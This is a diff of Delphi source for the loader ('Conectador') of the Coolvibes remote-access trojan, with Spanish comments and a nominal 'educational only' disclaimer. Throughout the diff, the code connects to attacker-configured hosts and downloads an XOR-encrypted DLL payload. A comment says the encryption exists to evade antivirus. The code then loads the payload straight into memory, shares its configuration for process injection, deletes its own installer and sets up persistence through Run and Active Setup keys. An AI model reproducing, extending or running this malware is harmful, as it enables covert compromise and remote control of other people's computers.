@@ -1,5 +1,4 @@
 {Unit principal del Conectador del troyano Coolvibes}
-
 (* Este código fuente se ofrece sólo con fines educativos.
    Queda absolutamente prohibido ejecutarlo en computadores
    cuyo dueño sea una persona diferente de usted, a no ser
@@ -12,10 +11,9 @@
 
      El equipo Coolvibes
 *)
-//library Conectador;
-program Conectador;  {En el futuro podrá ser tanto DLL como EXE dependiendo si se utilizará la injección o no}
-                     {De momento no se puede injectar ya que no leería la configuración}
-uses                 {Sí que se puede injectar si se compila desde el código fuente}
+//library Conectador; //Para inyectar descomentar
+program Conectador;   //para no inyectar descomentar
+uses
   Windows,
   BTMemoryModule, //Para cargar una DLL en memoria sin escribir en disco
   SettingsDef,
@@ -23,14 +21,19 @@ uses                 {Sí que se puede injectar si se compila desde el código fue
   shellapi,
   UnitInstalacion,
   vars,
-  Minireg,
-  SHFolder;
+  Shfolder,
+  Minireg;
 
 
 var
-  dllc:            string;
-  Close:           boolean;
-  i: integer;
+  dllc             :            string;
+  i                : integer;
+  MCompartida      : THandle;
+  ConfigCompartida : PConfigCompartida;
+  Indice           : string;
+  ClaveCifrado1, ClaveCifrado2 : integer; //Claves para cifrar el plugin
+  Loaded           : integer;
+  
 function LastPos(Needle: char; Haystack: string): integer;
 begin
   for Result := Length(Haystack) downto 1 do
@@ -68,20 +71,6 @@ begin
     result := false;
 end;
 
-
-function GetSpecialFolderPath(folder : integer) : string;    //Para el futuro %userdir%
-const
-  SHGFP_TYPE_CURRENT = 0;
-var
-  path: array [0..MAX_PATH] of char;
-begin
-  if SUCCEEDED(SHGetFolderPath(0,folder,0,SHGFP_TYPE_CURRENT,@path[0])) then
-    Result := path
-  else
-    Result := '';
-end;
-
-
 Function GetCurrentDirectory: String;     //conseguir dir actual sin sysutils
 Var
   a:string;
@@ -108,34 +97,34 @@ Begin
     Result := Output;
 End;
 
-function cifrar(text: ansistring): ansistring;
+function cifrar(text: ansistring;i:integer): ansistring;
 var
   iloop         :integer;
 begin
   for iloop := 1 to length(text) do
   begin
-    text[iloop] := chr(ord(text[iloop]) xor 66);//funcion de cifrado simple para evadir antiviruses, en el futuró deberá ser dinamica
+    text[iloop] := chr(ord(text[iloop]) xor i);//funcion de cifrado simple para evadir antiviruses
   end;
   result := text;
 end;
 
 function lc(const s: string): string;
-const a=1;
+  const a=1;
 var
-max, charno : cardinal;
-presult : pchar;
+  max, charno : cardinal;
+  presult : pchar;
 begin
-max := length(s);
-setlength(result, max);
-if max <= 0 then exit;
-presult := pchar(result);
-charno := 0;
-repeat
-presult[charno] := s[charno+a];
-if (s[charno+a]>= 'a') and (s[charno+a] <= 'z') then
-presult[charno] := char(ord(s[charno+a]) + 32);
-inc(charno);
-until(charno>= max);
+  max := length(s);
+  setlength(result, max);
+  if max <= 0 then exit;
+  presult := pchar(result);
+  charno := 0;
+  repeat
+    presult[charno] := s[charno+a];
+    if (s[charno+a]>= 'a') and (s[charno+a] <= 'z') then
+      presult[charno] := char(ord(s[charno+a]) + 32);
+    inc(charno);
+  until(charno>= max);
 end;
 
 
@@ -167,17 +156,27 @@ begin
 end;
 
 
-procedure loaddll(path:string);
+procedure loaddll(path:string);   //Funcion para cargar el servidor
 var
   content : string;
   p : pointer;
   m_DllDataSize: cardinal;
 begin
   content := readfile(path);
-  content := cifrar(content);
+  content := cifrar(content,ClaveCifrado2);
+  content := cifrar(content,ClaveCifrado1);
   p := @content[1];
+  m_DllDataSize := length(content);
   if(length(content) > 0) then
     BTMemoryLoadLibary(p, m_DllDataSize);   //injectamos DLL
+
+  Loaded := Loaded+1;
+  if(Loaded>10) then
+  begin
+    if(fileexists(Pchar(path))) then
+    deletefile(Pchar(path));      //Falla la carga de la dll mas de 10 veces... la borramos
+    Loaded := 0;
+  end;
 end;
 
 
@@ -213,9 +212,9 @@ var
    Enviar:       String;
    buf:          Array [0..0] of char;
    desco:        boolean;
-   iRecv:        integer;
+   iRecv:        int64;
    ssize:        string;
-   isize:        integer;
+   isize:        int64;
    plugin:       file;
    TotalRead:    integer;
    CurrRead:     integer;
@@ -223,12 +222,15 @@ var
    ByteArray:   array[0..1023] of char;
 begin
     desco := false;
-        while fileExists(dllc) do //ya tenemos la dll
+        {while fileExists(dllc) do //ya tenemos la dll
            loaddll(dllc);
-
-
-    host := Configuracion.sHost;
-    Port := Configuracion.iPort;
+                             }
+     if indice = '' then
+        indice := configuracion.shosts;
+    host := Copy(indice, 1, Pos(':', indice) -1 );
+    Delete(indice, 1, Pos(':', indice));
+    Port := strtoint(Copy(indice, 1, Pos('¬', indice) -1 ));
+    Delete(indice, 1, Pos('¬', indice));
 
 
 
@@ -245,10 +247,10 @@ begin
    if (winsock.Connect(lSocket, Addr, SizeOf(Addr)) = 0) then     //intentamos conectar
    begin //conectados
 
-     Enviar := 'GETSERVER'+#13+#10;
+     Enviar := 'GETSERVER|'+inttostr(clavecifrado1)+'|'+inttostr(clavecifrado2)+'|'+#13+#10;
      Send(lSocket, Enviar[1], length(Enviar), 0);  //pedimos el tamaño del servidor
      desco := false;
-
+     iRecv := 0;
      ZeroMemory(@buf, SizeOf(buf));
      iRecv := Recv(lSocket, buf, SizeOf(buf), 0);   //Tenemos que leer el MAININFO
      while (iRecv > 0) do
@@ -270,6 +272,7 @@ begin
        exit; //nos hemos desconectado
      end;
 
+      ssize := '';
       ZeroMemory(@buf, SizeOf(buf));
      iRecv := Recv(lSocket, buf, SizeOf(buf), 0);   //Recibimos el tamaño
      while (iRecv > 0) do
@@ -288,7 +291,6 @@ begin
      end;
    end;
 
-
      if(desco) then
      begin
        CloseSocket(lSocket);
@@ -297,7 +299,7 @@ begin
    isize := strtoint(ssize);//ya tenemos el tamaño
     if(isize <> 0) then
     begin
-
+    
    AssignFile(plugin, dllc);
    Rewrite(plugin, 1);
    Totalread := 0;
@@ -318,7 +320,7 @@ begin
 
    CloseFile(plugin);
    end;
-   
+
      if(desco) then
      begin
        DeleteFile(Pchar(dllc));
@@ -337,91 +339,96 @@ end;
 procedure loadsettings();
 var
     ConfigLeida: PSettings;
-    ConfigRegistro: string;
+    CerrarMonitor: boolean;
 begin
      //leerlo de la config?
-  if ReadSettings(ConfigLeida) = True then   //Como no estoy instalado o no estoy injectado puedo leer la configuracion como siempre
+  if ReadSettings(ConfigLeida) = True then   //Como no estoy injectado puedo leer la configuracion como siempre
     begin
-      Configuracion.sHost   := ConfigLeida^.sHost;
-      Configuracion.sPort   := ConfigLeida^.sPort;
-      Configuracion.sID     := ConfigLeida^.sID;
-      //Nombre que identifica al servidor. LeerID() intenta leer si hay algo escrito en el registro y si no devuelve este valor, configuracion.sID;
-      Configuracion.iPort   := ConfigLeida^.iPort;
-      //En segundos cada cuanto intenta conectarse el server al cliente
-      Configuracion.bCopiarArchivo := ConfigLeida^.bCopiarArchivo; //Me copio o no?
-      Configuracion.sFileNameToCopy := ConfigLeida^.sFileNameToCopy;
-      //nombre del nuevo archivo a copiar
-      Configuracion.sCopyTo := ConfigLeida^.sCopyTo;
-      //la carpeta donde debe copiarse
-      Configuracion.bCopiarConFechaAnterior := ConfigLeida^.bCopiarConFechaAnterior;
-      //Modificar la fecha del servidor?
-      Configuracion.bMelt   := ConfigLeida^.bMelt; //Melt?
-      Configuracion.bArranqueRun := ConfigLeida^.bArranqueRun;
-      //Me agrego a Policies?
-      Configuracion.sRunRegKeyName := ConfigLeida^.sRunRegKeyName;
-      //Nombre con el que me agrego a policies
-      //MessageBox(0, PChar('Leí la configuración bien. El puerto es: '+Configuracion.sPort), 'Leí', 0); //Para pruebas!!!
-      dllc := GetCurrentDirectory+'\'+ConfigLeida^.sPluginName;
-
-      //Preparamos la configuracion para agregarla al registro
-
-      ConfigRegistro := ConfigRegistro + ConfigLeida^.sHost+'|';
-      ConfigRegistro := ConfigRegistro + ConfigLeida^.sPort+'|';
-      ConfigRegistro := ConfigRegistro + ConfigLeida^.sID+'|';
-      ConfigRegistro := ConfigRegistro + inttostr(ConfigLeida^.iPort)+'|';
-      if(ConfigLeida^.bCopiarArchivo) then
-        ConfigRegistro := ConfigRegistro + 'true|'
-      else
-        ConfigRegistro := ConfigRegistro + 'false|';
-
-      ConfigRegistro := ConfigRegistro + ConfigLeida^.sFileNameToCopy+'|';
-      ConfigRegistro := ConfigRegistro + ConfigLeida^.sCopyTo+'|';
-
-      if(ConfigLeida^.bCopiarConFechaAnterior) then
-        ConfigRegistro := ConfigRegistro + 'true|'
-      else
-         ConfigRegistro := ConfigRegistro + 'false|';
-
-      if(ConfigLeida^.bMelt) then
-        ConfigRegistro := ConfigRegistro + 'true|'
-      else
-        ConfigRegistro := ConfigRegistro + 'false|';
-
-      if(ConfigLeida^.bArranqueRun) then
-        ConfigRegistro := ConfigRegistro + 'true|'
-      else
-        ConfigRegistro := ConfigRegistro + 'false|';
-
-
-      ConfigRegistro := ConfigRegistro + ConfigLeida^.sRunRegKeyName+'|';
-
-
-      RegSetString(HKEY_CURRENT_USER,'Software\C00l'{Quizas mejor un valor aleatorio?}, ConfigRegistro);
-     //hay que guardar la configuración al registro para que la lea el servidor
+      Configuracion.sHosts                        := ConfigLeida^.sHosts;
+      Configuracion.sID                          := ConfigLeida^.sID;
+      Configuracion.bCopiarArchivo               := ConfigLeida^.bCopiarArchivo;
+      Configuracion.sFileNameToCopy              := ConfigLeida^.sFileNameToCopy;
+      Configuracion.sCopyTo                      := ConfigLeida^.sCopyTo;
+      Configuracion.bCopiarConFechaAnterior      := ConfigLeida^.bCopiarConFechaAnterior;
+      Configuracion.bMelt                        := ConfigLeida^.bMelt;
+      Configuracion.bArranqueRun                 := ConfigLeida^.bArranqueRun;
+      Configuracion.sRunRegKeyName               := ConfigLeida^.sRunRegKeyName;
+      Configuracion.bArranqueActiveSetup         := ConfigLeida^.bArranqueActiveSetup;
+      Configuracion.sActiveSetupKeyName          := ConfigLeida^.sActiveSetupKeyName;
+      Configuracion.sPluginName                  := ConfigLeida^.sPluginName;
+      dllc                                       := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)+ConfigLeida^.sPluginName;
     end
     else
     begin
-    //halt;  //Si he llegado a este punto es que o no he podido leer la configuración o que estoy injectado en un proceso
-             //Así que tengo que leer la configuracion del registro
-      exitprocess(0);
-      {Configuracion.sHost   := '127.0.0.1';
-      Configuracion.sPort   := '7000';
-      Configuracion.sID     := 'Coolserver';
-      Configuracion.iPort   := 7000;
-      Configuracion.iTimeToNotify := 1;
-      //En segundos cada cuanto intenta conectarse el server al cliente
-      Configuracion.bCopiarArchivo := false; //Me copio o no?
-      Configuracion.sFileNameToCopy := 'coolserver.exe';
-      //nombre del nuevo archivo a copiar
-      Configuracion.sCopyTo := '%windir%\lol\'; //la carpeta donde debe copiarse
-      Configuracion.bCopiarConFechaAnterior := False; //Modificar la fecha del servidor?
-      Configuracion.bMelt   := False; //Melt?
-      Configuracion.bArranqueRun := False; //Me agrego a Policies?
-      Configuracion.sRunRegKeyName := 'Coolserver';
-      //Nombre con el que me agrego a policies
-      //MessageBox(0, PChar('Leí la configuración bien. El puerto es: '+Configuracion.sPort), 'Leí', 0); //Para pruebas!!!
-      dllc := GetCurrentDirectory+'\plugi.dat';  }
-    end;
+        //Estoy corriendo como injectado, así que tengo que leer la configuración escrita por Injector.exe desde memoria
+
+      MCompartida:=OpenFileMapping(FILE_MAP_READ,False,'Config');
+
+
+      if(MCompartida <> 0) then //Leida con Éxito :D
+      begin
+        ConfigCompartida:=MapViewOfFile(Mcompartida,FILE_MAP_READ,0,0,0);
+           //quizás habría que guardar esta configuración cifrada...
+         Configuracion.sHosts                    := ConfigCompartida.sHosts;
+         Configuracion.sID                      := ConfigCompartida.sID;
+         Configuracion.bCopiarArchivo           := ConfigCompartida.bCopiarArchivo;
+         Configuracion.sFileNameToCopy          := ConfigCompartida.sFileNameToCopy;
+         Configuracion.sCopyTo                  := ConfigCompartida.sCopyTo;
+         Configuracion.bCopiarConFechaAnterior  := ConfigCompartida.bCopiarConFechaAnterior;
+         Configuracion.bMelt                    := ConfigCompartida.bMelt;
+         Configuracion.bArranqueRun             := ConfigCompartida.bArranqueRun;
+         Configuracion.sRunRegKeyName           := ConfigCompartida.sRunRegKeyName;
+         Configuracion.bArranqueActiveSetup     := ConfigCompartida.bArranqueActiveSetup;
+         Configuracion.sActiveSetupKeyName      := ConfigCompartida.sActiveSetupKeyName;
+         Configuracion.sPluginName              := ConfigCompartida.sPluginName;
+         Configuracion.sInyectadorFile          := ConfigCompartida.sInyectadorFile;
+         UnmapViewOfFile(ConfigCompartida);
+         CloseHandle(MCompartida);    //La escribimos
+         dllc := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)+Configuracion.sPluginName;
+
+      end
+      else
+      begin   //Para Debug
+        Exitprocess(0);
+       { Configuracion.sHosts   := '127.0.0.1:80¬';
+        Configuracion.sID     := 'Coolserver';
+        Configuracion.bCopiarArchivo := false;
+        Configuracion.sFileNameToCopy := 'coolserver.exe';
+        Configuracion.sCopyTo := '%windir%\lol\';
+        Configuracion.bCopiarConFechaAnterior := False;
+        Configuracion.bMelt   := False;
+        Configuracion.bArranqueRun := true;
+        Configuracion.sRunRegKeyName := 'Coolserver';
+        Configuracion.sPluginName := 'coolserver.dll';
+        Configuracion.sActiveSetupKeyName := 'test';
+        Configuracion.bArranqueActiveSetup := true;
+        dllc := GetCurrentDirectory+'ºcoolserver.dll';
+        }
+      end;
+end;
+
+      ClaveCifrado1 := ord(Configuracion.shosts[length(Configuracion.shosts)-(length(Configuracion.shosts) div 2)+1]);
+      ClaveCifrado2 := ord(Configuracion.shosts[length(Configuracion.shosts)-(length(Configuracion.shosts) div 2)]);
+      MCompartida := CreateFileMapping( $FFFFFFFF,nil,PAGE_READWRITE,0,SizeOf(TSettings),'Config');
+      ConfigCompartida:=MapViewOfFile(MCompartida,FILE_MAP_WRITE,0,0,0);
+
+      //Escribimos datos en el fichero de memoria para que coolserver.dll los lea
+      ConfigCompartida^.sHosts                  := Configuracion.sHosts;
+      ConfigCompartida^.sID                     := Configuracion.sID;
+      ConfigCompartida^.bCopiarArchivo          := Configuracion.bCopiarArchivo;
+      ConfigCompartida^.sFileNameToCopy         :=  Configuracion.sFileNameToCopy;
+      ConfigCompartida^.sCopyTo                 := Configuracion.sCopyTo;
+      ConfigCompartida^.bCopiarConFechaAnterior := Configuracion.bCopiarConFechaAnterior;
+      ConfigCompartida^.bMelt                   := Configuracion.bMelt;
+      ConfigCompartida^.bArranqueRun            := Configuracion.bArranqueRun;
+      ConfigCompartida^.sRunRegKeyName          := Configuracion.sRunRegKeyName;
+      ConfigCompartida^.bArranqueActiveSetup    := Configuracion.bArranqueActiveSetup;
+      ConfigCompartida^.sActiveSetupKeyName     := Configuracion.sActiveSetupKeyName;
+      ConfigCompartida^.sPluginName             := Configuracion.sPluginName;
+      ConfigCompartida^.bCerrar                 := true; //Mandamos cerrar a Jeringa.exe para que deje de compartir él la configuración y se cierre
+	    ConfigCompartida^.sInyectadorFile := Configuracion.sInyectadorFile;
+
+
 end;
 
 
@@ -431,31 +438,33 @@ begin
 
  while true do
  begin
-    iniciar();
-    sleep(10000); //cada 10 segundos
     while fileExists(dllc) do
       loaddll(dllc);
+    iniciar();
+    sleep(10000); //cada 10 segundos
   end;
 
-  WSACleanup();
+        WSACleanup();
 end;
 
 
 
 begin
-   if ParamStr(1) = '\melt' then
+ if ParamStr(1) = '\melt' then  //esto pasará solamente si no tenemos la opción de inyectar
     begin
       //borro el archivo de instalación, reintento 5 veces por si las moscas :)
       for i := 1 to 5 do
       begin
-        BorrarArchivo(ParamStr(2));
         if not FileExists(ParamStr(2)) then
-          break; //si yalo borrò entonces se sale del for
+          break
+        else
+          DeleteFile(Pchar(ParamStr(2)));
         Sleep(10);
       end;
-      //Otra opción: while not BorrarArchivo(ParamStr(2)) do Sleep(10);
     end; //Termina el Melt
-  loadsettings();  //Leemos la configuración
+
+    
+  loadsettings();  //Leemos la configuración y la compartimos en caso de que haga falta
   Instalar();
   main();
 end.
